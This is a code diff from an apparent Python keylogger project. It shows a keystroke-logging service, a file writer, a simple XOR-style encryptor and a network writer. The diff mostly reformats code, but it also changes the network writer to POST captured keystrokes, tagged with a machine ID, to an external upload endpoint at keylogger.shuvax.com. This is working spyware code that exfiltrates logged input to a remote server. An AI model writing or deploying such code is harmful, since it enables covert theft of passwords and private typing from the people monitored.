@@ -1,5 +1,7 @@
-import requests,time,ToolBox,pygetwindow,json,random,string,os
-from Interface import IKeyLogger,Write
+import requests, time, ToolBox, pygetwindow, json, random, string, os
+from Interface import IKeyLogger, Write
+
+
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
@@ -28,14 +30,13 @@ class KeyLoggerService(IKeyLogger):
         # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
         return self.__logged_keys
 
-
     def clear_logged_keys(self) -> dict[str:str]:
-        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
-
+        self.__logged_keys = {self.__last_record: self.__logged_keys[
+            self.__last_record]} if self.__last_record in self.__logged_keys else {}
 
 
 class FileWriter(Write):
-    def __init__(self,path=None):
+    def __init__(self, path=None):
         self.path = ToolBox.get_file_path()
 
     def write(self, data: dict[str, str]) -> bool:
@@ -58,12 +59,18 @@ class FileWriter(Write):
         except (IOError, json.JSONDecodeError):
             return False
 
+
 class NetworkWriter(Write):
-    def __init__(self,url=None):
-        self.url = url or "https://keylogger.shuvax.com"
-    def write(self,data:dict[str:str]) -> bool:
+    def __init__(self, url=None):
+        self.url = url or "https://keylogger.shuvax.com/api/upload"
+
+    def write(self, data: dict[str:str]) -> bool:
+        req = {
+            "machine": str(1002),
+            "data": data
+        }
         try:
-            response = requests.post(self.url, json=data)
+            response = requests.post(self.url, json=req)
             return response.status_code == 200
         except requests.exceptions.RequestException:
             return False
@@ -71,9 +78,9 @@ class NetworkWriter(Write):
 
 class Encryptor:
     def __init__(self):
-        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+        self.key = "".join(random.choices(string.ascii_letters + string.digits, k=512))
 
-    def encrypt(self,data:str) -> str:
+    def encrypt(self, data: str) -> str:
         ciphertext = ""
         length_key = len(self.key)
         for index in range(len(data)):
